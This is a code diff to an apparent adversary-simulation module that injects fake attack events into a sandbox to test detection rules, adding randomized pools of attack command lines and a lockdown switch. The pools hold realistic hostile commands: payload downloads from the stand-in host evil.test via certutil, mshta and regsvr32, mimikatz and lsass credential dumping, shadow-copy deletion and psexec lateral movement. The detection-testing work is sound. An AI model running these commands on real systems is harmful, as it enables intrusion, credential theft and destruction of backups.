@@ -21,6 +21,8 @@ SAFETY INVARIANTS (enforced by _check_invariants):
 """
 
 import asyncio
+import hashlib
+import random
 import shutil
 import uuid
 from collections import deque
@@ -142,6 +144,7 @@ _SMITH_QUOTES = {
     "not_active": "I was never here, Mr. Anderson.",
     "timeout": "Time has expired. Even I cannot run forever.",
     "watchdog": "Session unresponsive. Self-terminating. Purpose... served.",
+    "lockdown": "The Guardian has spoken. I am... contained.",
 }
 
 
@@ -157,6 +160,199 @@ def _verdict(detection_rate: float) -> dict:
         return {"grade": "F", "comment": _SMITH_QUOTES["poor"]}
     else:
         return {"grade": "X", "comment": _SMITH_QUOTES["zero"]}
+
+
+# ---------------------------------------------------------------------------
+# Mutation pools (Phase 14 — variant generation)
+# ---------------------------------------------------------------------------
+
+_MUTATION_POOLS: dict[str, dict[str, list]] = {
+    "malware_process": {
+        "names": [
+            "mimikatz.exe", "beacon.exe", "emotet_dropper.exe", "meterpreter.exe",
+            "cobaltstrike.exe", "lazagne.exe", "rubeus.exe", "sharphound.exe",
+            "bloodhound.exe", "seatbelt.exe", "safetykatz.exe", "nanodump.exe",
+            "sharpwmi.exe", "covenant_grunt.exe", "sliver_implant.exe",
+            "bruteratel.exe", "havoc_demon.exe", "nighthawk.exe", "poshc2_agent.exe",
+            "mythic_apollo.exe",
+        ],
+        "dirs": [
+            r"C:\Users\attacker\Desktop", r"C:\ProgramData", r"C:\Users\Public",
+            r"C:\Temp", r"C:\Windows\Temp", r"C:\Users\admin\Downloads",
+            r"C:\Users\user\AppData\Local\Temp", r"C:\Recovery",
+            r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup",
+            r"C:\Users\Public\Documents", r"C:\Windows\Debug", r"C:\Windows\Tasks",
+            r"C:\Users\Default\AppData", r"C:\PerfLogs", r"C:\Intel",
+            r"C:\inetpub\wwwroot", r"C:\Users\admin\Desktop",
+            r"C:\Users\user\Documents", r"C:\ProgramData\Package Cache",
+            r"C:\Users\attacker\AppData\Roaming",
+        ],
+        "cmdline_styles": [
+            "privilege::debug sekurlsa::logonpasswords",
+            "-connect {ip}:{port}", "-download -stage2 http://evil.test/payload",
+            "reverse_tcp LHOST={ip} LPORT={port}", "/c {name} /silent",
+            "--exec-method smbexec --target {ip}", "-nop -sta -w hidden -enc",
+            "dumpCreds /user:admin /domain:corp.local",
+            "SharpHound.exe -c All --zipfilename output.zip",
+            "-a kerberos::golden /user:admin /domain:corp.local /sid:S-1-5-21",
+            "/inject /pid:{pid}", "--bypass amsi --obfuscate",
+            "-f beacon.dll /connect {ip}:{port}",
+            "execute-assembly /path/to/tool.exe", "--listener https --implant",
+        ],
+        "parents": [
+            "cmd.exe", "rundll32.exe", "winword.exe", "explorer.exe",
+            "powershell.exe", "svchost.exe", "wmiprvse.exe", "wscript.exe",
+            "cscript.exe", "taskeng.exe",
+        ],
+    },
+    "c2_beaconing": {
+        "ips": [
+            "45.33.32.156", "185.220.101.42", "91.215.85.17", "198.51.100.99",
+            "203.0.113.200", "10.99.99.1", "172.16.0.100", "192.168.100.50",
+            "45.77.65.211", "104.248.50.87", "157.245.33.77", "178.128.21.65",
+            "139.59.27.180", "64.225.32.190", "46.101.35.122",
+        ],
+        "user_agents": [
+            "Mozilla/5.0 (Windows NT 10.0) Cobalt Strike Beacon",
+            "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1) Meterpreter",
+            "curl/7.83.1", "Python-urllib/3.10", "Go-http-client/1.1",
+            "Java/11.0.2", "Wget/1.21.3", "PowerShell/7.3.1",
+            "Opera/9.80 (Windows NT 6.0) CS Malleable",
+            "Microsoft Office/16.0 Macro Callback",
+            "SliverHTTPC2/1.5", "BruteRatel/1.0", "Havoc/0.5",
+            "NightHawk/2.0", "Mythic/3.0",
+        ],
+        "protocols": ["https_443", "http_8080", "dns_53", "tcp_4444", "tcp_8443"],
+    },
+    "ransomware": {
+        "extensions": [
+            ".cerber", ".locky", ".cry", ".encrypted", ".locked", ".crypt",
+            ".wnry", ".wcry", ".wncry", ".onion", ".aesir", ".dharma",
+            ".phobos", ".ryuk", ".conti", ".lockbit", ".revil", ".hive",
+            ".blackcat", ".akira", ".royal", ".play", ".clop", ".maze",
+            ".medusa", ".rhysida", ".trigona", ".blackbasta", ".bianlian",
+            ".alphv",
+        ],
+        "ransom_notes": [
+            "README_DECRYPT.txt", "HOW_TO_DECRYPT.txt", "RESTORE_FILES.txt",
+            "DECRYPT_INSTRUCTIONS.html", "RANSOM_NOTE.txt",
+            "YOUR_FILES_ARE_ENCRYPTED.txt", "RECOVER_YOUR_DATA.txt",
+            "IMPORTANT_READ_ME.txt", "WARNING.txt", "PAYMENT_INFO.txt",
+            "HELP_DECRYPT.txt", "_readme.txt", "DECRYPT-FILES.txt",
+            "READ_TO_DECRYPT.txt", "INSTRUCTIONS.html",
+        ],
+        "shadow_variants": [
+            "vssadmin delete shadows /all /quiet",
+            "vssadmin.exe delete shadows /for=C: /quiet",
+            "wmic shadowcopy delete",
+            "powershell.exe Get-WmiObject Win32_ShadowCopy | ForEach-Object { $_.Delete() }",
+            "vssadmin resize shadowstorage /for=C: /on=C: /maxsize=401MB",
+        ],
+    },
+    "lolbin_abuse": {
+        "combos": [
+            ("certutil.exe", "certutil.exe -urlcache -split -f http://evil.test/{payload} C:\\Temp\\{payload}"),
+            ("mshta.exe", "mshta.exe http://evil.test/{payload}.hta"),
+            ("regsvr32.exe", "regsvr32.exe /s /n /u /i:http://evil.test/{payload}.sct scrobj.dll"),
+            ("rundll32.exe", "rundll32.exe C:\\Temp\\{payload}.dll,DllMain"),
+            ("msbuild.exe", "msbuild.exe C:\\Users\\Public\\{payload}.xml"),
+            ("cmstp.exe", "cmstp.exe /ni /s C:\\Temp\\{payload}.inf"),
+            ("wmic.exe", "wmic.exe process call create C:\\Temp\\{payload}.exe"),
+            ("bitsadmin.exe", "bitsadmin.exe /transfer job /download /priority high http://evil.test/{payload} C:\\Temp\\{payload}"),
+            ("certutil.exe", "certutil.exe -decode C:\\Temp\\{payload}.b64 C:\\Temp\\{payload}.exe"),
+            ("mshta.exe", "mshta.exe vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"{payload}\"\"\")"),
+            ("regsvr32.exe", "regsvr32.exe /s C:\\Temp\\{payload}.dll"),
+            ("rundll32.exe", "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";document.write('<script>new ActiveXObject(\"WScript.Shell\").Run(\"{payload}\")</script>')"),
+            ("msbuild.exe", "msbuild.exe /p:Configuration=Release C:\\Users\\Public\\{payload}.csproj"),
+            ("cmstp.exe", "cmstp.exe /s C:\\Windows\\Temp\\{payload}.inf"),
+            ("forfiles.exe", "forfiles.exe /p C:\\Windows /m svchost.exe /c C:\\Temp\\{payload}.exe"),
+            ("pcalua.exe", "pcalua.exe -a C:\\Temp\\{payload}.exe"),
+            ("explorer.exe", "explorer.exe C:\\Temp\\{payload}.exe"),
+            ("control.exe", "control.exe C:\\Temp\\{payload}.dll"),
+            ("bash.exe", "bash.exe -c '/mnt/c/Temp/{payload}'"),
+            ("wscript.exe", "wscript.exe C:\\Temp\\{payload}.vbs"),
+        ],
+        "download_urls": [
+            "http://evil.test/payload.exe", "http://evil.test/update.dll",
+            "http://evil.test/malware.hta", "http://evil.test/dropper.sct",
+            "http://evil.test/stage2.bin", "http://evil.test/beacon.dll",
+            "http://evil.test/implant.ps1", "http://evil.test/loader.xml",
+            "http://evil.test/shell.inf", "http://evil.test/agent.b64",
+            "http://evil.test/tool.csproj", "http://evil.test/rat.vbs",
+            "http://evil.test/c2.js", "http://evil.test/exploit.py",
+            "http://evil.test/backdoor.msi",
+        ],
+        "payloads": [
+            "payload", "update", "malware", "dropper", "stage2",
+            "beacon", "implant", "loader", "shell", "agent",
+        ],
+    },
+    "credential_dump": {
+        "tools": [
+            ("mimikatz.exe", "mimikatz.exe {technique} exit"),
+            ("procdump64.exe", "procdump64.exe -accepteula -ma lsass.exe {output}"),
+            ("lazagne.exe", "lazagne.exe all -oJ"),
+            ("secretsdump.py", "python.exe secretsdump.py -sam SAM -system SYSTEM LOCAL"),
+            ("ntdsutil.exe", 'ntdsutil.exe "activate instance ntds" ifm "create full {output}" quit quit'),
+            ("reg.exe", r"reg.exe save HKLM\{hive} {output}"),
+            ("comsvcs.dll", "rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump {pid} {output} full"),
+            ("pypykatz.exe", "pypykatz.exe live lsa"),
+            ("crackmapexec.exe", "crackmapexec.exe smb {ip} -u admin -p pass --sam"),
+            ("sharpdpapi.exe", "sharpdpapi.exe triage"),
+        ],
+        "techniques": [
+            "sekurlsa::logonpasswords", "lsadump::sam", "sekurlsa::wdigest",
+            "lsadump::dcsync /user:krbtgt", "sekurlsa::pth /user:admin",
+            "lsadump::trust", "sekurlsa::ekeys", "token::elevate lsadump::secrets",
+            "sekurlsa::credman", "misc::memssp",
+        ],
+        "outputs": [
+            r"C:\Temp\lsass.dmp", r"C:\Temp\sam.hive", r"C:\Temp\ntds.dit",
+            r"C:\Temp\creds.json", r"C:\Temp\system.hive", r"C:\Temp\security.hive",
+        ],
+        "hives": ["SAM", "SYSTEM", "SECURITY"],
+    },
+    "lateral_movement": {
+        "targets": [
+            "192.168.1.50", "192.168.1.100", "10.0.0.25", "10.0.0.50",
+            "172.16.0.10", "172.16.0.20", "SERVER01", "SERVER02",
+            "DC01", "FILESVR", "WEBSVR", "SQLSVR",
+        ],
+        "protocols": [
+            ("psexec.exe", r"psexec.exe \\{target} -u admin -p pass cmd.exe"),
+            ("wmic.exe", "wmic.exe /node:{target} process call create cmd.exe"),
+            ("smbexec.py", "python.exe smbexec.py admin:pass@{target}"),
+            ("winrm", "winrs.exe -r:{target} -u:admin -p:pass cmd.exe"),
+            ("dcom", "python.exe dcomexec.py admin:pass@{target}"),
+            ("schtasks.exe", r"schtasks.exe /create /s {target} /tn backdoor /tr C:\Temp\shell.exe /sc minute /mo 5"),
+            ("PSEXESVC.exe", r"C:\Windows\PSEXESVC.exe"),
+            ("at.exe", r"at.exe \\{target} 12:00 C:\Temp\shell.exe"),
+        ],
+        "service_names": [
+            "PSEXESVC", "RemoteExec", "UpdateSvc", "MaintSvc",
+            "HealthCheck", "MonitorAgent", "SyncService", "BackupSvc",
+        ],
+    },
+    "exfiltration": {
+        "dest_ips": [
+            "203.0.113.42", "198.51.100.10", "192.0.2.55", "203.0.113.100",
+            "198.51.100.200", "192.0.2.150", "45.33.32.100", "185.220.101.50",
+        ],
+        "protocols": [
+            ("curl.exe", 443, "HTTPS"),
+            ("dns_tunnel.exe", 53, "DNS"),
+            ("powershell.exe", 8080, "HTTP"),
+            ("ftp.exe", 21, "FTP"),
+            ("nslookup.exe", 53, "DNS"),
+            ("bitsadmin.exe", 443, "HTTPS"),
+            ("certutil.exe", 80, "HTTP"),
+        ],
+        "data_sizes": [
+            5_000_000, 10_000_000, 25_000_000, 50_000_000, 75_000_000,
+            100_000_000, 150_000_000, 200_000_000, 500_000_000,
+        ],
+    },
+}
 
 
 # ---------------------------------------------------------------------------
@@ -194,6 +390,13 @@ class AgentSmith(BaseModule):
         self._attack_log: deque[dict] = deque(maxlen=500)
         self._results: deque[dict] = deque(maxlen=50)
         self._current_attacks: list[dict] = []
+
+        # Attack fingerprinting — never repeat (Phase 14)
+        self._fingerprints: set[str] = set()
+
+        # Guardian lockdown (Phase 14 — set by Commander Bond)
+        self._guardian_lockdown: bool = False
+        self._guardian_lockdown_reason: str = ""
 
         # Module references (set externally after construction)
         self._alert_manager = None
@@ -240,6 +443,8 @@ class AgentSmith(BaseModule):
                 "intensity": self._intensity if self._active else None,
                 "events_injected": self._events_injected,
                 "sessions_completed": len(self._results),
+                "unique_attacks_generated": len(self._fingerprints),
+                "guardian_lockdown": self._guardian_lockdown,
             },
         }
 
@@ -253,19 +458,18 @@ class AgentSmith(BaseModule):
         categories: list[str] | None = None,
         duration: int = 300,
     ) -> dict:
-        """Start an adversary simulation session.
+        """Start an adversary simulation session."""
+        # --- Guardian lockdown check (Phase 14) ---
+        if self._guardian_lockdown:
+            return {
+                "status": "rejected",
+                "reason": "guardian_lockdown",
+                "message": _SMITH_QUOTES["lockdown"],
+                "lockdown_reason": self._guardian_lockdown_reason,
+                "locked_by": "Commander Bond",
+                "clear_via": "POST /bond/guardian/clear",
+            }
 
-        Args:
-            intensity: Attack intensity level 1-5.
-            categories: Specific category IDs, or None for preset selection.
-            duration: Maximum session duration in seconds (capped at 600).
-
-        Returns:
-            dict with session_id, status, and Smith commentary.
-
-        Raises:
-            SmithContainmentBreach: If safety invariants are violated.
-        """
         # --- Pre-flight checks ---
         if self._active:
             return {
@@ -381,6 +585,20 @@ class AgentSmith(BaseModule):
             "message": _SMITH_QUOTES["disengage"],
         }
 
+    async def _emergency_disengage(self, reason: str) -> None:
+        """Guardian-triggered forced shutdown."""
+        logger.warning("smith_emergency_disengage", reason=reason)
+        if self._active:
+            await self.disengage()
+        self._guardian_lockdown = True
+        self._guardian_lockdown_reason = reason
+
+    def _guardian_clear(self) -> None:
+        """Clear guardian lockdown — only callable by Bond."""
+        self._guardian_lockdown = False
+        self._guardian_lockdown_reason = ""
+        logger.info("smith_guardian_lockdown_cleared")
+
     def get_status(self) -> dict:
         """Get current Smith status including session details."""
         base = super().get_status()
@@ -406,10 +624,14 @@ class AgentSmith(BaseModule):
             "duration_seconds": self._max_duration if self._active else 0,
             "attack_log_size": len(self._attack_log),
             "attacks_launched": self._events_injected,
-            "attacks_detected": sum(1 for a in self._attack_log if a.get("detected")),
-            "attacks_missed": sum(1 for a in self._attack_log if not a.get("detected") and not a.get("pending")),
+            # BUG FIX (Phase 14 Track 4): Use nested detection.detected path
+            "attacks_detected": sum(1 for a in self._attack_log if a.get("detection", {}).get("detected", False)),
+            "attacks_missed": sum(1 for a in self._attack_log if not a.get("detection", {}).get("detected", False) and not a.get("pending")),
             "attacks_pending": sum(1 for a in self._attack_log if a.get("pending")),
             "sessions_completed": len(self._results),
+            "unique_attacks_generated": len(self._fingerprints),
+            "guardian_lockdown": self._guardian_lockdown,
+            "guardian_lockdown_reason": self._guardian_lockdown_reason,
         })
         return base
 
@@ -426,6 +648,138 @@ class AgentSmith(BaseModule):
     def get_categories(self) -> list[dict]:
         """Get available attack simulation categories."""
         return list(_ALL_CATEGORIES)
+
+    # ------------------------------------------------------------------
+    # Mutation engine (Phase 14)
+    # ------------------------------------------------------------------
+
+    def _mutate_attack(self, category: str, base: dict) -> dict:
+        """Apply mutation layers to randomize attack details. Returns mutated copy."""
+        mutated = dict(base)
+        pool = _MUTATION_POOLS.get(category, {})
+        if not pool:
+            return mutated
+
+        if category == "malware_process":
+            name = random.choice(pool["names"])
+            dir_path = random.choice(pool["dirs"])
+            parent = random.choice(pool["parents"])
+            cmdline_tpl = random.choice(pool["cmdline_styles"])
+            pid = random.randint(80000, 99999)
+            ip = f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
+            port = random.randint(1024, 65535)
+            cmdline = cmdline_tpl.format(name=name, ip=ip, port=port, pid=pid)
+            mutated.update({
+                "name": name,
+                "exe": f"{dir_path}\\{name}",
+                "cmdline": f"{name} {cmdline}",
+                "parent_name": parent,
+                "ppid": random.randint(1000, 9999),
+                "pid": pid,
+            })
+
+        elif category == "c2_beaconing":
+            ip = random.choice(pool["ips"])
+            port = random.choice([443, 4444, 8080, 8443, 53, 80, 1337, 9090])
+            interval = int(random.uniform(15000, 90000))
+            ua = random.choice(pool["user_agents"])
+            proto = random.choice(pool["protocols"])
+            mutated.update({
+                "remote_addr": ip,
+                "remote_port": port,
+                "beacon_interval_ms": interval,
+                "user_agent": ua,
+                "protocol_hint": proto,
+                "local_port": random.randint(49152, 65535),
+                "pid": random.randint(80000, 99999),
+            })
+
+        elif category == "ransomware":
+            ext = random.choice(pool["extensions"])
+            note = random.choice(pool["ransom_notes"])
+            shadow_cmd = random.choice(pool["shadow_variants"])
+            mutated.update({
+                "ransom_extension": ext,
+                "ransom_note": note,
+                "cmdline": shadow_cmd,
+                "details": f"Ransomware simulation: {ext} extension, note={note}",
+                "pid": random.randint(80000, 99999),
+            })
+
+        elif category == "lolbin_abuse":
+            combo = random.choice(pool["combos"])
+            payload = random.choice(pool["payloads"])
+            lolbin_name = combo[0]
+            cmdline = combo[1].format(payload=payload)
+            mutated.update({
+                "name": lolbin_name,
+                "exe": f"C:\\Windows\\System32\\{lolbin_name}",
+                "cmdline": cmdline,
+                "pid": random.randint(80000, 99999),
+            })
+
+        elif category == "credential_dump":
+            tool_info = random.choice(pool["tools"])
+            technique = random.choice(pool["techniques"])
+            output = random.choice(pool["outputs"])
+            hive = random.choice(pool["hives"])
+            ip = f"192.168.1.{random.randint(1, 254)}"
+            cmdline = tool_info[1].format(
+                technique=technique, output=output, hive=hive,
+                pid=random.randint(500, 999), ip=ip,
+            )
+            mutated.update({
+                "name": tool_info[0],
+                "exe": f"C:\\Tools\\{tool_info[0]}",
+                "cmdline": cmdline,
+                "details": f"Credential dump via {tool_info[0]}: {technique}",
+                "pid": random.randint(80000, 99999),
+            })
+
+        elif category == "lateral_movement":
+            target = random.choice(pool["targets"])
+            proto_info = random.choice(pool["protocols"])
+            service = random.choice(pool["service_names"])
+            cmdline = proto_info[1].format(target=target)
+            mutated.update({
+                "name": proto_info[0],
+                "cmdline": cmdline,
+                "details": f"Lateral movement via {proto_info[0]} to {target} (service: {service})",
+                "pid": random.randint(80000, 99999),
+            })
+
+        elif category == "exfiltration":
+            dest_ip = random.choice(pool["dest_ips"])
+            proto_info = random.choice(pool["protocols"])
+            size = random.choice(pool["data_sizes"])
+            mutated.update({
+                "remote_addr": dest_ip,
+                "remote_port": proto_info[1],
+                "name": proto_info[0],
+                "bytes_sent": size,
+                "transfer_size": size,
+                "details": f"Exfiltration via {proto_info[2]}: {size // 1_000_000}MB to {dest_ip}",
+                "pid": random.randint(80000, 99999),
+            })
+
+        return mutated
+
+    def _compute_fingerprint(self, category: str, attack: dict) -> str:
+        """Compute SHA-256 fingerprint of key attack fields."""
+        key_fields = f"{category}|{attack.get('description', '')}|{attack.get('cmdline', '')}|{attack.get('name', '')}|{attack.get('remote_addr', '')}"
+        return hashlib.sha256(key_fields.encode()).hexdigest()
+
+    def _generate_unique_attack(self, category: str, base: dict, max_attempts: int = 5) -> dict:
+        """Generate a mutated attack that hasn't been seen before."""
+        for _ in range(max_attempts):
+            mutated = self._mutate_attack(category, base)
+            fp = self._compute_fingerprint(category, mutated)
+            if fp not in self._fingerprints:
+                self._fingerprints.add(fp)
+                return mutated
+        # If all attempts produce duplicates, use the last mutation anyway
+        self._fingerprints.add(fp)
+        return mutated
 
     # ------------------------------------------------------------------
     # Session execution
@@ -564,50 +918,24 @@ class AgentSmith(BaseModule):
             }
 
     # ------------------------------------------------------------------
-    # Attack simulators
+    # Attack simulators (mutated — Phase 14)
     # ------------------------------------------------------------------
 
     async def _simulate_malware_process(self, event_index: int) -> dict:
-        """Inject fake malware process entries."""
+        """Inject fake malware process entries with mutation."""
         attack_id = f"{self._session_id}-malware-{event_index}"
         now = datetime.now(timezone.utc).isoformat()
 
-        malware_samples = [
-            {
-                "name": "mimikatz.exe",
-                "pid": 90001 + event_index,
-                "exe": r"C:\Users\attacker\Desktop\mimikatz.exe",
-                "cmdline": "mimikatz.exe privilege::debug sekurlsa::logonpasswords",
-                "parent_name": "cmd.exe",
-                "ppid": 4200,
-            },
-            {
-                "name": "beacon.exe",
-                "pid": 90101 + event_index,
-                "exe": r"C:\ProgramData\beacon.exe",
-                "cmdline": r"C:\ProgramData\beacon.exe -connect 10.0.0.99:443",
-                "parent_name": "rundll32.exe",
-                "ppid": 4300,
-            },
-            {
-                "name": "emotet_dropper.exe",
-                "pid": 90201 + event_index,
-                "exe": r"C:\Users\Public\emotet_dropper.exe",
-                "cmdline": r"emotet_dropper.exe -download -stage2 http://evil.test/payload",
-                "parent_name": "winword.exe",
-                "ppid": 4400,
-            },
-            {
-                "name": "meterpreter.exe",
-                "pid": 90301 + event_index,
-                "exe": r"C:\Temp\meterpreter.exe",
-                "cmdline": r"meterpreter.exe reverse_tcp LHOST=192.168.1.99 LPORT=4444",
-                "parent_name": "explorer.exe",
-                "ppid": 4500,
-            },
-        ]
+        base = {
+            "name": "mimikatz.exe",
+            "pid": 90001,
+            "exe": r"C:\Users\attacker\Desktop\mimikatz.exe",
+            "cmdline": "mimikatz.exe privilege::debug sekurlsa::logonpasswords",
+            "parent_name": "cmd.exe",
+            "ppid": 4200,
+        }
 
-        sample = malware_samples[event_index % len(malware_samples)]
+        sample = self._generate_unique_attack("malware_process", base)
         fake_event = {
             **sample,
             "create_time": now,
@@ -616,16 +944,13 @@ class AgentSmith(BaseModule):
             "_smith_session_id": self._session_id,
         }
 
-        # Inject into process analyzer simulated list
         self._inject_simulated_process(fake_event)
-
-        # Test detection via rule engine
-        detection = self._check_detection(attack_id, "malware_process", sample["name"], fake_event)
+        detection = self._check_detection(attack_id, "malware_process", sample.get("name", "unknown"), fake_event)
 
         return {
             "attack_id": attack_id,
             "category": "malware_process",
-            "description": f"Malware process injection: {sample['name']}",
+            "description": f"Malware process injection: {sample.get('name', 'unknown')}",
             "injected_event": fake_event,
             "detection": detection,
             "timestamp": now,
@@ -633,82 +958,49 @@ class AgentSmith(BaseModule):
         }
 
     async def _simulate_c2_beaconing(self, event_index: int) -> dict:
-        """Inject fake C2 beaconing connections."""
+        """Inject fake C2 beaconing connections with mutation."""
         attack_id = f"{self._session_id}-c2-{event_index}"
         now = datetime.now(timezone.utc).isoformat()
 
-        # Ordered: most detectable (by rule engine) first so even intensity-1
-        # single-event tests hit a rule-matchable sample.
-        c2_samples = [
-            {
-                "remote_addr": "45.33.32.156",
-                "remote_port": 4444,
-                "local_port": 49300 + event_index,
-                "status": "ESTABLISHED",
-                "pid": 91201 + event_index,
-                "name": "cobaltstrike_beacon.exe",
-                "bytes_sent": 64,
-                "bytes_recv": 2048,
-                "beacon_interval_ms": 45000,
-                "cmdline": "cobaltstrike beacon.dll /connect 45.33.32.156:4444",
-            },
-            {
-                "remote_addr": "185.220.101.42",
-                "remote_port": 443,
-                "local_port": 49152 + event_index,
-                "status": "ESTABLISHED",
-                "pid": 91001 + event_index,
-                "name": "svchost.exe",
-                "bytes_sent": 256,
-                "bytes_recv": 512,
-                "beacon_interval_ms": 60000,
-                "cmdline": "svchost.exe -k netsvcs",
-                "details": "Periodic beacon callback every 60s to 185.220.101.42:443 — cobaltstrike malleable C2 profile",
-            },
-            {
-                "remote_addr": "91.215.85.17",
-                "remote_port": 8443,
-                "local_port": 49200 + event_index,
-                "status": "ESTABLISHED",
-                "pid": 91101 + event_index,
-                "name": "rundll32.exe",
-                "bytes_sent": 128,
-                "bytes_recv": 1024,
-                "beacon_interval_ms": 30000,
-                "cmdline": "rundll32.exe C:\\ProgramData\\meterpreter.dll,Start",
-                "details": "Meterpreter reverse_tcp beacon via rundll32 proxy every 30s",
-            },
-        ]
+        base = {
+            "remote_addr": "45.33.32.156",
+            "remote_port": 4444,
+            "local_port": 49300,
+            "status": "ESTABLISHED",
+            "pid": 91201,
+            "name": "cobaltstrike_beacon.exe",
+            "bytes_sent": 64,
+            "bytes_recv": 2048,
+            "beacon_interval_ms": 45000,
+            "cmdline": "cobaltstrike beacon.dll /connect 45.33.32.156:4444",
+        }
 
-        sample = c2_samples[event_index % len(c2_samples)]
+        sample = self._generate_unique_attack("c2_beaconing", base)
         fake_event = {
             **sample,
             "event_type": "network_connection",
+            "status": "ESTABLISHED",
             "timestamp": now,
             "_smith_simulation": True,
             "_smith_attack_id": attack_id,
             "_smith_session_id": self._session_id,
         }
 
-        # Inject into network sentinel simulated list
         self._inject_simulated_connection(fake_event)
 
-        # Also test via rule engine (C2 tool signatures)
-        # Merge sample's own details (which may contain C2 tool names) with connection info
-        sample_details = sample.get("details", "")
-        conn_info = f"C2 beaconing to {sample['remote_addr']}:{sample['remote_port']} interval={sample.get('beacon_interval_ms', 0)}ms"
+        conn_info = f"C2 beaconing to {sample.get('remote_addr', '?')}:{sample.get('remote_port', '?')} interval={sample.get('beacon_interval_ms', 0)}ms"
         rule_event = {
             "name": sample.get("name", ""),
             "cmdline": sample.get("cmdline", ""),
-            "details": f"{conn_info} — {sample_details}" if sample_details else conn_info,
+            "details": conn_info,
             "_smith_simulation": True,
         }
-        detection = self._check_detection(attack_id, "c2_beaconing", f"C2 beacon to {sample['remote_addr']}", rule_event)
+        detection = self._check_detection(attack_id, "c2_beaconing", f"C2 beacon to {sample.get('remote_addr', '?')}", rule_event)
 
         return {
             "attack_id": attack_id,
             "category": "c2_beaconing",
-            "description": f"C2 beaconing to {sample['remote_addr']}:{sample['remote_port']}",
+            "description": f"C2 beaconing to {sample.get('remote_addr', '?')}:{sample.get('remote_port', '?')}",
             "injected_event": fake_event,
             "detection": detection,
             "timestamp": now,
@@ -716,58 +1008,37 @@ class AgentSmith(BaseModule):
         }
 
     async def _simulate_ransomware(self, event_index: int) -> dict:
-        """Simulate ransomware behavior in the sandbox."""
+        """Simulate ransomware behavior in the sandbox with mutation."""
         attack_id = f"{self._session_id}-ransom-{event_index}"
         now = datetime.now(timezone.utc).isoformat()
 
-        # Ordered: rule-detectable actions first so even intensity-1
-        # single-event tests produce a rule match (R034).
-        ransomware_actions = [
-            {
-                "action": "shadow_delete",
-                "description": "Shadow copy deletion via vssadmin",
-                "cmdline": "vssadmin delete shadows /all /quiet",
-                "details": "Shadow copy deletion simulation",
-            },
-            {
-                "action": "bcdedit_recovery",
-                "description": "Recovery disabled via bcdedit",
-                "cmdline": "bcdedit /set {default} recoveryenabled no",
-                "details": "Boot recovery disabled",
-            },
-            {
-                "action": "mass_rename",
-                "description": "Mass file extension change to .encrypted",
-                "cmdline": "cmd.exe /c for %f in (*.docx *.xlsx *.pdf) do ren \"%f\" \"%f.encrypted\"",
-                "details": "Ransomware mass rename simulation in sandbox — rapid extension change across 20+ files",
-            },
-            {
-                "action": "ransom_note",
-                "description": "Ransom note creation and service mass-stop",
-                "cmdline": "net stop vss && net stop sql && echo YOUR FILES ARE ENCRYPTED > README_DECRYPT.txt",
-                "details": "Ransom note dropped: README_DECRYPT.txt with service shutdown",
-            },
-        ]
+        base = {
+            "action": "shadow_delete",
+            "description": "Shadow copy deletion via vssadmin",
+            "cmdline": "vssadmin delete shadows /all /quiet",
+            "details": "Shadow copy deletion simulation",
+        }
 
-        action = ransomware_actions[event_index % len(ransomware_actions)]
+        sample = self._generate_unique_attack("ransomware", base)
 
         # Create harmless files in sandbox for mass-rename simulation
-        if action["action"] == "mass_rename":
+        ext = sample.get("ransom_extension", ".encrypted")
+        if "mass_rename" in sample.get("details", "") or ext:
             sandbox_sub = self._sandbox_dir / f"ransom_test_{event_index}"
             if self._validate_sandbox_path(str(sandbox_sub)):
                 sandbox_sub.mkdir(parents=True, exist_ok=True)
                 for i in range(5):
                     dummy = sandbox_sub / f"document_{i}.txt"
                     dummy.write_text(f"Smith simulation file {i}")
-                    renamed = sandbox_sub / f"document_{i}.txt.encrypted"
+                    renamed = sandbox_sub / f"document_{i}.txt{ext}"
                     dummy.rename(renamed)
 
         fake_event = {
             "name": "ransomware_sim.exe",
-            "pid": 92001 + event_index,
+            "pid": sample.get("pid", 92001 + event_index),
             "exe": r"C:\Temp\ransomware_sim.exe",
-            "cmdline": action["cmdline"],
-            "details": action["details"],
+            "cmdline": sample.get("cmdline", ""),
+            "details": sample.get("details", ""),
             "event_type": "process_event",
             "timestamp": now,
             "_smith_simulation": True,
@@ -775,16 +1046,15 @@ class AgentSmith(BaseModule):
             "_smith_session_id": self._session_id,
         }
 
-        # Inject process entry and test detection
-        if action["cmdline"]:
+        if sample.get("cmdline"):
             self._inject_simulated_process(fake_event)
 
-        detection = self._check_detection(attack_id, "ransomware", action["description"], fake_event)
+        detection = self._check_detection(attack_id, "ransomware", sample.get("details", "ransomware"), fake_event)
 
         return {
             "attack_id": attack_id,
             "category": "ransomware",
-            "description": action["description"],
+            "description": sample.get("details", "Ransomware simulation"),
             "injected_event": fake_event,
             "detection": detection,
             "timestamp": now,
@@ -792,44 +1062,18 @@ class AgentSmith(BaseModule):
         }
 
     async def _simulate_lolbin(self, event_index: int) -> dict:
-        """Inject fake LOLBin abuse process entries."""
+        """Inject fake LOLBin abuse process entries with mutation."""
         attack_id = f"{self._session_id}-lolbin-{event_index}"
         now = datetime.now(timezone.utc).isoformat()
 
-        lolbin_samples = [
-            {
-                "name": "certutil.exe",
-                "pid": 93001 + event_index,
-                "exe": r"C:\Windows\System32\certutil.exe",
-                "cmdline": "certutil.exe -urlcache -split -f http://evil.test/payload.exe C:\\Temp\\payload.exe",
-            },
-            {
-                "name": "mshta.exe",
-                "pid": 93101 + event_index,
-                "exe": r"C:\Windows\System32\mshta.exe",
-                "cmdline": "mshta.exe http://evil.test/malicious.hta",
-            },
-            {
-                "name": "regsvr32.exe",
-                "pid": 93201 + event_index,
-                "exe": r"C:\Windows\System32\regsvr32.exe",
-                "cmdline": "regsvr32.exe /s /n /u /i:http://evil.test/file.sct scrobj.dll",
-            },
-            {
-                "name": "rundll32.exe",
-                "pid": 93301 + event_index,
-                "exe": r"C:\Windows\System32\rundll32.exe",
-                "cmdline": r"rundll32.exe C:\Temp\malicious.dll,DllMain",
-            },
-            {
-                "name": "msbuild.exe",
-                "pid": 93401 + event_index,
-                "exe": r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe",
-                "cmdline": r"msbuild.exe C:\Users\Public\AppData\Local\Temp\evil.xml",
-            },
-        ]
+        base = {
+            "name": "certutil.exe",
+            "pid": 93001,
